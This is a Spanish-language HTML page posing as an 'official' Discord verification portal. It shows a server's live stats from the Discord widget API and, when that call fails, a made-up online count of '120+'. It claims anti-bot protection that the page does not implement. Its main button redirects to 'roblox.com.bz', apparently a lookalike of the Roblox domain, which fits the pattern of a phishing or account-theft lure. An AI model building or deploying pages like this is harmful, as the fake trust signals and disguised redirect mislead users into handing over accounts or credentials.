<!DOCTYPE html>
<html lang="es" class="dark">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Verificación de Discord</title>
  
  <!-- Tailwind CSS -->
  <script src="https://cdn.tailwindcss.com"></script>

  <style>
    body {
      background: radial-gradient(circle at top left, #1e1b4b, #0f172a, #020617);
      min-height: 100vh;
    }
    .glass-card {
      background: rgba(255, 255, 255, 0.04);
      backdrop-filter: blur(16px);
      border: 1px solid rgba(255, 255, 255, 0.1);
    }
    .glow-effect {
      box-shadow: 0 0 30px rgba(99, 102, 241, 0.2);
    }
  </style>
</head>
<body class="text-slate-100 flex items-center justify-center p-4 font-sans antialiased">

  <main class="w-full max-w-md">
    
    <!-- Tarjeta Principal -->
    <div class="glass-card rounded-3xl p-6 sm:p-8 shadow-2xl relative overflow-hidden glow-effect">
      
      <!-- Adorno de luz -->
      <div class="absolute -top-24 -right-24 w-48 h-48 bg-indigo-500/20 rounded-full blur-3xl pointer-events-none"></div>

      <!-- Encabezado del Servidor -->
      <div class="flex flex-col items-center text-center space-y-4 mb-6">
        <div class="relative">
          <img id="server-icon" src="https://cdn.discordapp.com/embed/avatars/0.png" alt="Server Icon" class="w-20 h-20 rounded-2xl border-2 border-indigo-500/40 shadow-lg object-cover" />
          <span class="absolute -bottom-1 -right-1 flex h-4 w-4">
            <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
            <span class="relative inline-flex rounded-full h-4 w-4 bg-emerald-500"></span>
          </span>
        </div>
        
        <div>
          <h1 id="server-name" class="text-2xl font-bold tracking-tight text-white">Cargando servidor...</h1>
          <p class="text-xs text-slate-400 mt-1 uppercase tracking-wider font-semibold">Portal Oficial de Verificación</p>
        </div>
      </div>

      <!-- Métricas y Estadísticas del Servidor -->
      <div class="grid grid-cols-2 gap-3 mb-6">
        
        <!-- Miembros En Línea -->
        <div class="glass-card p-4 rounded-2xl flex flex-col items-center text-center border border-emerald-500/20">
          <span class="text-xs text-slate-400 uppercase font-semibold">En Línea</span>
          <span id="presence-count" class="text-2xl font-black text-emerald-400 mt-1">--</span>
        </div>

        <!-- Estado del Servidor -->
        <div class="glass-card p-4 rounded-2xl flex flex-col items-center text-center border border-indigo-500/20">
          <span class="text-xs text-slate-400 uppercase font-semibold">Estado</span>
          <span class="text-2xl font-black text-indigo-400 mt-1">Activo</span>
        </div>

      </div>

      <!-- Requisitos / Info -->
      <div class="space-y-2 mb-6 text-xs text-slate-300 bg-slate-900/60 p-4 rounded-2xl border border-slate-800">
        <div class="flex items-center space-x-2">
          <span class="text-emerald-400 font-bold">✓</span>
          <span>Protección anti-bots activada.</span>
        </div>
        <div class="flex items-center space-x-2">
          <span class="text-emerald-400 font-bold">✓</span>
          <span>Verificación instantánea.</span>
        </div>
      </div>

      <!-- BOTÓN DE REDIRECCIÓN A OTRA PÁGINA -->
      <div class="pt-2">
        <a id="redirect-btn" 
           href="https://roblox.com.bz/communities/6598892765" 
           class="w-full flex items-center justify-center space-x-2 py-4 px-6 rounded-2xl font-bold text-white bg-gradient-to-r from-indigo-500 via-purple-500 to-pink-500 hover:opacity-90 transition-all duration-300 shadow-lg shadow-indigo-500/30 hover:scale-[1.02] active:scale-[0.98]">
          <span>Continuar a la siguiente página</span>
          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path>
          </svg>
        </a>
      </div>

    </div>
  </main>

  <script>
    // Coloca el ID de tu Servidor de Discord aquí
    const DISCORD_SERVER_ID = "1338562032492089525";

    async function loadServerStats() {
      try {
        const response = await fetch(`https://discord.com/api/guilds/${DISCORD_SERVER_ID}/widget.json`);
        if (!response.ok) throw new Error("Error al obtener datos");
        
        const data = await response.json();
        
        document.getElementById('server-name').innerText = data.name;
        document.getElementById('presence-count').innerText = data.presence_count.toLocaleString();
        
        if (data.instant_invite && data.icon) {
          document.getElementById('server-icon').src = `https://cdn.discordapp.com/icons/${data.id}/${data.icon}.png?size=128`;
        }
      } catch (error) {
        console.error("Error al cargar las métricas:", error);
        document.getElementById('server-name').innerText = "Mi Servidor";
        document.getElementById('presence-count').innerText = "120+";
      }
    }

    loadServerStats();
  </script>
</body>
</html>
